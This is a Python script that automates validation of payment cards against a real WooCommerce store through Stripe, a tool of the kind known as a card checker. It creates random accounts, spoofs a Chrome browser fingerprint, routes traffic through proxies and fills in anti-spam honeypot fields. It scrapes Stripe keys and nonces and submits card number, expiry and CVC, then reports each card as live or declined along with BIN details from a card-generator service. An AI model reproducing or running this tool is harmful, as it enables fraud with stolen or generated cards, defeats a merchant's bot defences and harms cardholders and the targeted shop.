from datetime import datetime
import time
import hashlib
import json
import os
import random
import re
from curl_cffi import requests
import requests as std_requests
import string
import uuid

# ========================================
# CONFIGURATION
# ========================================
BASE_URL = "https://dashboardpack.com"
CARD_COUNTRY = "BD"

# ========================================
# PAYMENT METHOD ADDER CLASS
# ========================================
class PaymentMethodAdder:
    """Handles the complete flow of adding payment methods to WooCommerce"""
    
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session(impersonate="chrome124")
        if proxy:
            self.session.proxies = format_proxy(proxy)
        self.stripe_key = None
        self.email = None
        self.password = None
        self.proxy_str = proxy
        self.create_and_confirm_nonce = None

    def generate_random_account(self):
        """Generate random email and password for registration"""
        rand_id = str(uuid.uuid4())[:10]
        self.email = f"user_{rand_id}@testmail.com"
        chars = string.ascii_letters + string.digits + "!@#$"
        self.password = ''.join(random.choice(chars) for _ in range(12)) + "1aA!"
        print(f"🎲 Generated random account: {self.email}")
        return self.email, self.password
    
    def check_if_logged_in(self):
        """Check if already logged in (Statically returns False for registration flow)"""
        return False

    def get_registration_data(self):
        """Get registration nonce and anti-spam fields from my-account page"""
        print("🔄 Warming up session (visiting home page)...")
        try:
            # Step 1: Visit home page to get initial cookies and look like a human
            warmup_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            self.session.get(f'{self.base_url}/', headers=warmup_headers)
            time.sleep(random.uniform(1, 3))

            print("🔄 Getting registration data (nonce & anti-spam)...")
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': f'{self.base_url}/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/', headers=headers)
            
            if response.status_code == 200:
                data = {}
                
                # Extract all hidden inputs (including nonces and honeypot fields)
                hidden_inputs = re.findall(r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]+value="([^"]*)"', response.text)
                for name, value in hidden_inputs:
                    data[name] = value
                
                # Extract Honeypot field (e.g., oldtkb...)
                match_spam = re.search(r'<input[^>]+name="(oldtkb[^"]+)"[^>]+value="([^"]+)"', response.text)
                if match_spam:
                    data[match_spam.group(1)] = match_spam.group(2)
                    print(f"✅ Anti-spam field detected: {match_spam.group(1)}={match_spam.group(2)}")
                
                # The wpa_initiator value is usually set by JS. 
                # Let's see if there's any value in the script.
                wpa_match = re.search(r'"wpa_field_value":\s*(\d+)', response.text)
                if wpa_match:
                    field_value = wpa_match.group(1)
                    field_name_match = re.search(r'"wpa_field_name":"(oldtkb[^"]+)"', response.text)
                    if field_name_match:
                        data[field_name_match.group(1)] = field_value
                        print(f"✅ Honeypot field from script: {field_name_match.group(1)}={field_value}")

                return data
            else:
                print(f"❌ Failed to load my-account page: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error getting registration data: {e}")
            return None

    def register(self, reg_info):
        """Register a new account"""
        if not self.email or not self.password:
            self.generate_random_account()

        print(f"🔄 Registering as {self.email}...")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': self.base_url,
            'priority': 'u=0, i',
            'referer': f'{self.base_url}/my-account/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        data = {
            'email': self.email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{self.base_url}/',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': headers['user-agent'],
            'wpa_initiator': '',
            'woocommerce-register-nonce': reg_info.get('woocommerce-register-nonce'),
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            'alt_s': '',
        }
        
        # Add any other fields from reg_info (like the anti-spam field)
        for k, v in reg_info.items():
            if k not in data:
                data[k] = v
        
        try:
            response = self.session.post(
                f'{self.base_url}/my-account/',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                if 'customer-logout' in response.text or 'Logout' in response.text or 'My Account' in response.text:
                    if 'Login' not in response.text or 'Register' not in response.text: # Simple heuristic
                        print(f"✅ Registration successful for {self.email}!")
                        return True
                
                print(f"❌ Registration seemed to fail (not logged in).")
                # Check for error messages
                error_match = re.search(r'<ul class="woocommerce-error" role="alert">\s*<li>(.*?)</li>', response.text, re.DOTALL)
                if error_match:
                    print(f"   Error: {error_match.group(1).strip()}")
                return False
                
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False
    
    def extract_stripe_key_and_nonce(self):
        """Extract Stripe key and createAndConfirmSetupIntentNonce from payment pages"""
        print("🔄 Extracting Stripe key and createAndConfirmSetupIntentNonce...")
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': f'{self.base_url}/my-account/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            
            if response.status_code == 200:
                with open('page_debug.html', 'w', encoding='utf-8') as f:
                    f.write(response.text)
                print(f"📝 Page content saved to page_debug.html ({len(response.text)} bytes)")
                stripe_patterns = [
                    r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
                    r'"key"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
                ]
                
                for pattern in stripe_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        self.stripe_key = match.group(1)
                        print(f"✅ Stripe key extracted: {self.stripe_key[:20]}...")
                        break
                
                # Try to extract the specific nonce from UPE params or scripts
                nonce_patterns = [
                    r'"wc_stripe_confirm_setup_intent_nonce"\s*:\s*"([a-f0-9]+)"',
                    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                    r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([a-f0-9]+)"',
                    r'"_wpnonce"\s*:\s*"([a-f0-9]+)"',
                ]
                
                for pattern in nonce_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        self.create_and_confirm_nonce = match.group(1)
                        print(f"✅ Nonce extracted ({pattern}): {self.create_and_confirm_nonce}")
                        break
                
                if not self.create_and_confirm_nonce:
                    # Try to extract wc_stripe_upe_params if available
                    upe_match = re.search(r'var\s+wc_stripe_upe_params\s*=\s*({.*?});', response.text, re.DOTALL)
                    if upe_match:
                        try:
                            # Use a more flexible regex for JSON-like objects in JS
                            params_text = upe_match.group(1)
                            n_match = re.search(r'"wc_stripe_confirm_setup_intent_nonce"\s*:\s*"([a-f0-9]+)"', params_text)
                            if n_match:
                                self.create_and_confirm_nonce = n_match.group(1)
                                print(f"✅ Extracted nonce from upe_params: {self.create_and_confirm_nonce}")
                        except:
                            pass
                
                if not self.stripe_key:
                    print("❌ Could not find Stripe key in page")
                    
                if not self.create_and_confirm_nonce:
                    print("❌ Could not find createAndConfirmSetupIntentNonce in page")
                
                return self.stripe_key, self.create_and_confirm_nonce
            else:
                print(f"❌ Failed to load payment method page: {response.status_code}")
                return None, None
                
        except Exception as e:
            print(f"❌ Error extracting data: {e}")
            return None, None
    
    def extract_hcaptcha_sitekey(self):
        """Extract hCaptcha sitekey from the payment page"""
        print("🔄 Checking for hCaptcha on payment page...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': f'{self.base_url}/my-account/payment-methods/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }
            response = self.session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers)
            if response.status_code == 200:
                for pattern in [r'data-sitekey="([a-f0-9\-]+)"', r'sitekey:\s*["\']([a-f0-9\-]+)["\']', r'"sitekey"\s*:\s*"([a-f0-9\-]+)"', r'hcaptcha\.com.*?sitekey=([a-f0-9\-]+)']:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        print(f"✅ hCaptcha sitekey found: {match.group(1)}")
                        return match.group(1)
                print("ℹ️  No hCaptcha found on page (might not be required)")
                return None
            print(f"❌ Failed to load payment page: {response.status_code}")
            return None
        except Exception as e:
            print(f"❌ Error checking for hCaptcha: {e}")
            return None
    
    def create_stripe_payment_method(self, card_data, hcaptcha_token=None):
        """Create a payment method using Stripe API"""
        print("🔄 Creating Stripe payment method...")
        
        if not self.stripe_key:
            print("❌ No Stripe key available")
            return None
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        card_number = card_data.get('number', '').replace(' ', '+')
        
        # Extract muid and sid from cookies
        muid = self.session.cookies.get('__stripe_mid', '')
        sid = self.session.cookies.get('__stripe_sid', '')
        guid = str(uuid.uuid4())
        
        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': card_data.get('cvc', ''),
            'card[exp_year]': card_data.get('exp_year', ''),
            'card[exp_month]': card_data.get('exp_month', ''),
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': card_data.get('country', 'BD'),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; payment-element; deferred-intent',
            'referrer': self.base_url,
            'time_on_page': random.randint(15000, 30000),
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': self.stripe_key,
            '_stripe_version': '2024-06-20',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        }

        if hcaptcha_token:
            data['radar_options[hcaptcha_token]'] = hcaptcha_token
            
        # Filter out empty values
        data = {k: v for k, v in data.items() if v}

        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                payment_method = response.json()
                payment_method_id = payment_method.get('id')
                print(f"✅ Stripe payment method created: {payment_method_id}")
                return payment_method_id
            else:
                print(f"❌ Failed to create Stripe payment method: {response.text}")
                return None
                
        except Exception as e:
            print(f"❌ Error creating Stripe payment method: {e}")
            return None
    
    def add_payment_method_to_account(self, payment_method_id):
        """Add the payment method to WooCommerce account using createAndConfirmSetupIntentNonce"""
        print(f"🔄 Adding payment method to account...")
        
        if not self.create_and_confirm_nonce:
            print("❌ No createAndConfirmSetupIntentNonce available")
            return False, None, "No createAndConfirmSetupIntentNonce available"
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'referer': f'{self.base_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': self.create_and_confirm_nonce,
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                try:
                    result = response.json()
                except Exception as e:
                    print(f"❌ Failed to parse AJAX response: {e}")
                    print(f"   Response text: {response.text}")
                    return False, None, f"Failed to parse AJAX response: {e}"

                if result.get('success') == True:
                    setup_intent_data = result.get('data', {})
                    setup_intent_id = setup_intent_data.get('id')
                    print(f"✅ Payment method added successfully!")
                    print(f"   Status: {setup_intent_data.get('status')}")
                    print(f"   Setup Intent ID: {setup_intent_id}")
                    return True, setup_intent_id, "Payment method added successfully"
                else:
                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    print(f"❌ Failed to add payment method: {result}")
                    return False, None, error_msg
            else:
                print(f"❌ Error adding payment method: Status {response.status_code}")
                print(f"   Response: {response.text}")
                return False, None, f"Error adding payment method: Status {response.status_code}"
                
        except Exception as e:
            print(f"❌ Error adding payment method: {e}")
            return False, None, str(e)
    
    def run(self, card_data, hcaptcha_token=None):
        """Main execution flow with retry logic"""
        print("=" * 60)
        print("🚀 Starting Payment Method Addition Process")
        print("=" * 60)
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {self.base_url}")
        if self.proxy_str:
            print(f"Proxy: {self.proxy_str}")
        print(f"Email: {self.email}")
        print(f"Card: {card_data.get('number', 'N/A')}")
        print("=" * 60)
        
        import time
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts:
            if not self.check_if_logged_in():
                reg_info = self.get_registration_data()
                if not reg_info:
                    attempts += 1
                    if attempts < max_attempts:
                        print(f"⚠️ Retrying in 5 seconds... (Attempt {attempts}/{max_attempts})")
                        time.sleep(5)
                        continue
                    print("\n💥 Failed to get registration data!")
                    return None, None, False, "Failed to get registration data"
                
                if not self.register(reg_info):
                    attempts += 1
                    if attempts < max_attempts:
                        print(f"⚠️ Registration failed. Retrying... (Attempt {attempts}/{max_attempts})")
                        time.sleep(5)
                        continue
                    print("\n💥 Failed to register!")
                    return None, None, False, "Failed to register"
            break
        
        stripe_key, create_and_confirm_nonce = self.extract_stripe_key_and_nonce()
        
        if not self.stripe_key:
            print("\n💥 Failed to extract Stripe key!")
            return None, None, False, "Failed to extract Stripe key"
        
        if not self.create_and_confirm_nonce:
            print("\n💥 Failed to extract createAndConfirmSetupIntentNonce!")
            return None, None, False, "Failed to extract createAndConfirmSetupIntentNonce"
        
        sitekey = self.extract_hcaptcha_sitekey()
        if sitekey and not hcaptcha_token:
            print("\n⚠️  hCaptcha detected but no token provided!")
            print(f"   Site URL: {self.base_url}/my-account/add-payment-method/")
            print(f"   Sitekey: {sitekey}")
            print("   You can solve it manually and pass the token via the API")
        
        payment_method_id = self.create_stripe_payment_method(card_data, hcaptcha_token)
        if not payment_method_id:
            print("\n💥 Failed to create payment method!")
            return None, None, False, "Failed to create payment method"
        
        success, setup_intent_id, message = self.add_payment_method_to_account(payment_method_id)
        
        if success:
            print("\n" + "=" * 60)
            print("🎉 Payment Method Addition Completed Successfully!")
            print("=" * 60)
            return payment_method_id, setup_intent_id, True, message
        
        print("\n💥 Failed to add payment method to account!")
        return payment_method_id, None, False, message

# ========================================
# HELPER FUNCTIONS
# ========================================

def advanced_luhn_checksum(card_number):
    """Luhn algorithm দিয়ে card number validate করা"""
    def digits_of(n):
        return [int(d) for d in str(n)]

    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]

    total = sum(odd_digits)

    for digit in even_digits:
        doubled = digit * 2
        total += doubled if doubled < 10 else (doubled - 9)

    return total % 10 == 0

def is_valid_card(card_number):
    """Card number টা valid কিনা check করা"""
    card_number = str(card_number).replace(' ', '').replace('-', '')
    
    if not card_number.isdigit():
        return False
    
    if len(card_number) < 13 or len(card_number) > 19:
        return False
    
    return advanced_luhn_checksum(card_number)

def get_bin_info(card_number):
    """BIN API থেকে card information নিয়ে আসা"""
    try:
        bin_number = str(card_number)[:6]
        
        print(f"🔍 Fetching BIN info for: {bin_number}")
        # Use standard requests for BIN API to avoid curl_cffi fingerprint issues
        response = std_requests.get(f'https://cc-gen-lime.vercel.app/bin/{bin_number}', timeout=10)
        
        if response.status_code == 200:
            bin_data = response.json()
            if bin_data.get('bin'):
                print(f"✅ BIN info found: {bin_data.get('scheme', 'N/A')}")
                return {
                    'issuer': bin_data.get('bank', 'N/A'),
                    'brand': bin_data.get('scheme', 'N/A'),
                    'Country': {'Name': bin_data.get('country', 'N/A')},
                    'level': bin_data.get('tier', 'N/A'),
                    'type': bin_data.get('type', 'N/A')
                }
        
        print("❌ BIN info not found")
        return None
            
    except Exception as e:
        print(f"❌ Error fetching BIN info: {e}")
        return None

def parse_card_details(auth_string):
    """Parse card details from auth string format: NUMBER|MONTH|YEAR|CVC"""
    try:
        parts = auth_string.split('|')
        if len(parts) != 4:
            return None
        
        card_number, exp_month, exp_year, cvc = parts
        
        card_number = card_number.strip().replace(' ', '').replace('-', '')
        exp_month = exp_month.strip().zfill(2)
        cvc = cvc.strip()
        
        exp_year = exp_year.strip()
        if len(exp_year) == 2:
            pass
        elif len(exp_year) == 4:
            exp_year = exp_year[2:]
        else:
            return None
        
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvc': cvc
        }
    except Exception as e:
        print(f"Error parsing card details: {e}")
        return None

# ========================================
# ENDPOINT HANDLER
# ========================================
def handle_endpoint(auth, hcaptcha_token='', email=None, password=None, proxy=None):
    """
    Main endpoint handler for DashboardPack payment validation
    Returns: (response_dict, status_code)
    """
    if not auth:
        return {
            'success': False,
            'error': 'Missing auth parameter',
            'message': 'Please provide card details in format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC'
        }, 400
    
    card_data = parse_card_details(auth)
    
    if not card_data:
        return {
            'success': False,
            'error': 'Invalid card details format',
            'message': 'Format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC (year can be 2 or 4 digits)',
            'example': '5444228403258437|11|2028|327'
        }, 400
    
    try:
        print(f"🔐 Validating card: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        
        bin_info = get_bin_info(card_data['number'])
        
        if not is_valid_card(card_data['number']):
            error_result = {}
            
            if bin_info:
                error_result['bin_info'] = {
                    'bank': bin_info.get('issuer', 'N/A'),
                    'brand': bin_info.get('brand', 'N/A'),
                    'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                    'level': bin_info.get('level', 'N/A'),
                    'type': bin_info.get('type', 'N/A')
                }
            
            error_result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
            error_result['gateway'] = 'Stripe'
            error_result['message'] = 'Invalid card number (Failed Luhn validation)'
            error_result['status'] = 'error'
            
            return error_result, 400
        
        print("✅ Card passed Luhn validation")
        
        adder = PaymentMethodAdder(
            base_url=BASE_URL,
            proxy=proxy
        )
        
        payment_method_id, setup_intent_id, success, message = adder.run(
            card_data=card_data,
            hcaptcha_token=hcaptcha_token if hcaptcha_token else None
        )
        
        result = {}
        
        if bin_info:
            result['bin_info'] = {
                'bank': bin_info.get('issuer', 'N/A'),
                'brand': bin_info.get('brand', 'N/A'),
                'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                'level': bin_info.get('level', 'N/A'),
                'type': bin_info.get('type', 'N/A')
            }
        
        result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
        result['gateway'] = 'Stripe'
        result['message'] = message
        result['payment_method_id'] = payment_method_id
        result['setup_intent_id'] = setup_intent_id
        result['status'] = 'success' if success else 'declined'
        
        return result, 200
            
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        return {
            'success': False,
            'error': str(e),
            'message': 'An error occurred while processing the request',
            'type': type(e).__name__
        }, 500

def format_proxy(proxy_str):
    """
    Format proxy string from ip:port:user:pass to http://user:pass@ip:port
    Returns dict for requests or None if invalid
    """
    if not proxy_str:
        return None
    try:
        parts = proxy_str.strip().split(':')
        if len(parts) != 4:
            return None
        ip = parts[0]
        port = parts[1]
        user = parts[2]
        password = parts[3]
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    except:
        return None
